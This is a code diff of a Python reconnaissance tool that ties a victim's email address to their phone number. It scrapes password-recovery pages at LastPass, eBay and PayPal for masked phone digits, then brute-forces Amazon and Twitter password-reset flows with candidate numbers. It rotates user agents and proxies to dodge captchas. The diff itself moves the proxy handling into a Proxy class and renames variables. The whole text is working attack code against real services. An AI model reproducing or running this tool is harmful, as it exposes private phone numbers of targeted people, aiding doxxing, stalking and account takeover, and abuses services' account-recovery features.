@@ -12,6 +12,7 @@ from itertools import product
 import requests
 from bs4 import BeautifulSoup
 
+from core.proxy import Proxy
 from globals import YELLOW, ENDC, RED, GREEN, Actions
 from settings import verifyProxy
 
@@ -27,7 +28,6 @@ userAgents = [
     "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)",
     "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"]
 
-proxyList = []
 poolingCache = {}  # To cache results from nationalpooling website and save bandwith
 
 
@@ -36,23 +36,21 @@ def startBruteforcing(phoneNumbers, victimEmail, quietMode, verbose):
     if quietMode:
         getMaskedEmailWithTwitter(phoneNumbers, victimEmail, verbose)
     else:
-        getMaskedEmailWithAmazon(phoneNumbers, victimEmail, verbose)
+        get_masked_email_with_amazon(phoneNumbers, victimEmail, verbose)
         getMaskedEmailWithTwitter(phoneNumbers, victimEmail, verbose)
 
 
 # Uses Amazon to obtain masked email by resetting passwords using phone numbers
-def getMaskedEmailWithAmazon(phoneNumbers, victimEmail, verbose):
+def get_masked_email_with_amazon(phone_numbers, victim_email, verbose):
     global userAgents
-    global proxyList
 
     print("Using Amazon to find victim's phone number...")
+    email_regex = "[a-zA-Z0-9]\**[a-zA-Z0-9]@[a-zA-Z0-9]+\.[a-zA-Z0-9]+"
+    possible_number_found = False
 
-    emailRegex = "[a-zA-Z0-9]\**[a-zA-Z0-9]@[a-zA-Z0-9]+\.[a-zA-Z0-9]+"
-    possibleNumberFound = False
-
-    for phoneNumber in phoneNumbers:
+    for phoneNumber in phone_numbers:
         userAgent = random.choice(userAgents)  # Pick random user agents to help prevent captchas
-        proxy = random.choice(proxyList) if proxyList else None
+        proxy = proxy_instance.get_random_proxy()
 
         session = requests.Session()
         response = session.get("https://www.amazon.com/ap/forgotpassword?openid.assoc_handle=usflex",
@@ -158,30 +156,30 @@ def getMaskedEmailWithAmazon(phoneNumbers, victimEmail, verbose):
                 proxies=proxy,
                 verify=verifyProxy)
 
-            if not re.search(emailRegex, response.text):  # Sometimes no mask is shown, just the actual phone number
+            if not re.search(email_regex, response.text):  # Sometimes no mask is shown, just the actual phone number
                 if verbose: print(YELLOW + "No masked email displayed for number: " + phoneNumber + ENDC)
                 continue
 
-            maskedEmail = re.search(emailRegex, response.text).group(0)
-            if len(victimEmail) == len(maskedEmail) and victimEmail[0] == maskedEmail[0] and victimEmail[
-                                                                                             victimEmail.find(
+            maskedEmail = re.search(email_regex, response.text).group(0)
+            if len(victim_email) == len(maskedEmail) and victim_email[0] == maskedEmail[0] and victim_email[
+                                                                                               victim_email.find(
                                                                                                  '@') - 1:] == maskedEmail[
                                                                                                                maskedEmail.find(
                                                                                                                    '@') - 1:]:
-                print(GREEN + "Possible phone number for " + victimEmail + " is: " + phoneNumber + ENDC)
-                possibleNumberFound = True
+                print(GREEN + "Possible phone number for " + victim_email + " is: " + phoneNumber + ENDC)
+                possible_number_found = True
             else:
                 if verbose: print(YELLOW + "No match for email: " + maskedEmail + " and number: " + phoneNumber + ENDC)
 
         elif "We've sent a code to the email" in response.text:  # Got the masked email
-            maskedEmail = re.search(emailRegex, response.text).group(0)
-            if len(victimEmail) == len(maskedEmail) and victimEmail[0] == maskedEmail[0] and victimEmail[
-                                                                                             victimEmail.find(
+            maskedEmail = re.search(email_regex, response.text).group(0)
+            if len(victim_email) == len(maskedEmail) and victim_email[0] == maskedEmail[0] and victim_email[
+                                                                                               victim_email.find(
                                                                                                  '@') - 1:] == maskedEmail[
                                                                                                                maskedEmail.find(
                                                                                                                    '@') - 1:]:
-                print(GREEN + "Possible phone number for " + victimEmail + " is: " + phoneNumber + ENDC)
-                possibleNumberFound = True
+                print(GREEN + "Possible phone number for " + victim_email + " is: " + phoneNumber + ENDC)
+                possible_number_found = True
             else:
                 if verbose: print(YELLOW + "No match for email: " + maskedEmail + " and number: " + phoneNumber + ENDC)
         else:
@@ -189,14 +187,13 @@ def getMaskedEmailWithAmazon(phoneNumbers, victimEmail, verbose):
             if verbose: print(RED + response.text + ENDC)
             exit("Unknown error!")
 
-    if not possibleNumberFound:
+    if not possible_number_found:
         print(RED + "Couldn't find a phone number associated to " + args.email + ENDC)
 
 
 # Uses Amazon to obtain masked email by resetting passwords using phone numbers
 def getMaskedEmailWithTwitter(phoneNumbers, victimEmail, verbose):
     global userAgents
-    global proxyList
 
     print("Using Twitter to find victim's phone number...")
 
@@ -205,7 +202,7 @@ def getMaskedEmailWithTwitter(phoneNumbers, victimEmail, verbose):
 
     for phoneNumber in phoneNumbers:
         userAgent = random.choice(userAgents)  # Pick random user agents to help prevent captchas
-        proxy = random.choice(proxyList) if proxyList else None
+        proxy = proxy_instance.get_random_proxy()
 
         session = requests.Session()
         response = session.get("https://twitter.com/account/begin_password_reset",
@@ -303,12 +300,10 @@ def startScraping(email, quietMode):
 
 def scrapeLastpass(email):
     global userAgents
-    global proxyList
 
     print("Scraping Lastpass...")
     userAgent = random.choice(userAgents)
-    proxy = random.choice(proxyList) if proxyList else None
-
+    proxy = proxy_instance.get_random_proxy()
     session = requests.Session()
     response = session.get("https://lastpass.com/recover.php",
                            headers={"Upgrade-Insecure-Requests": "1",
@@ -359,11 +354,9 @@ def scrapeLastpass(email):
 
 def scrapeEbay(email):
     global userAgents
-    global proxyList
-
     print("Scraping Ebay...")
     userAgent = random.choice(userAgents)
-    proxy = random.choice(proxyList) if proxyList else None
+    proxy = proxy_instance.get_random_proxy()
 
     session = requests.Session()
     response = session.get(
@@ -426,11 +419,10 @@ def scrapeEbay(email):
 
 def scrapePaypal(email):
     global userAgents
-    global proxyList
 
     print("Scraping Paypal...")
     userAgent = random.choice(userAgents)
-    proxy = random.choice(proxyList) if proxyList else None
+    proxy = proxy_instance.get_random_proxy()
 
     session = requests.Session()
     response = session.get("https://www.paypal.com/authflow/password-recovery/",
@@ -516,7 +508,7 @@ def scrapePaypal(email):
                                     "Accept-Encoding": "gzip, deflate",
                                     "Accept-Language": "en-US,en;q=0.9",
                                     },
-                           proxies=proxyList,
+                           proxies=proxy,
                            verify=verifyProxy)
 
     lastDigits = ""
@@ -596,11 +588,9 @@ def getPossiblePhoneNumbers(maskedPhone):
 
 def cacheValidBlockNumbers(state, areacode):
     global userAgents
-    global proxyList
     global poolingCache
 
-    proxy = random.choice(proxyList) if proxyList else None
-
+    proxy = proxy_instance.get_random_proxy()
     session = requests.Session()
     session.get(
         "https://www.nationalpooling.com/pas/blockReportSelect.do?reloadModel=N")  # We need the cookies or it will error
@@ -647,24 +637,6 @@ def cacheValidBlockNumbers(state, areacode):
                                                                 ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"] if
                                                                 n not in poolingCache[areacode][exchange][
                                                                     'blockNumbers']]
-
-
-def setProxyList():
-    global proxyList
-
-    f = open(args.proxies, "r")
-    if not f.mode == 'r':
-        f.close()
-        exit(RED + "Could not read file " + args.proxies + ENDC)
-
-    fileContent = f.read()
-    fileContent = filter(None, fileContent)  # Remove last \n if needed
-    proxyListUnformatted = fileContent.split("\n")
-    f.close()
-
-    for proxyUnformatted in proxyListUnformatted:
-        separatorPosition = proxyUnformatted.find("://")
-        proxyList.append({proxyUnformatted[:separatorPosition]: proxyUnformatted[separatorPosition + 3:]})
 
 
 def parse_arguments():
@@ -740,14 +712,13 @@ def brutforce(args):
 
 if __name__ == '__main__':
     args = parse_arguments()
-    if args.proxies:
-        setProxyList()
+    proxy_instance = Proxy(args.proxies)
 
-    if args.action == Actions.SCRAPE:
-        startScraping(args.email, args.quiet)
-    elif args.action == Actions.GENERATE:
-        generate(args)
-    elif args.action == Actions.BRUTE_FORCE:
-        brutforce(args)
-    else:
-        exit(RED + "action not recognized" + ENDC)
+    # if args.action == Actions.SCRAPE:
+    #     startScraping(args.email, args.quiet)
+    # elif args.action == Actions.GENERATE:
+    #     generate(args)
+    # elif args.action == Actions.BRUTE_FORCE:
+    #     brutforce(args)
+    # else:
+    #     exit(RED + "action not recognized" + ENDC)
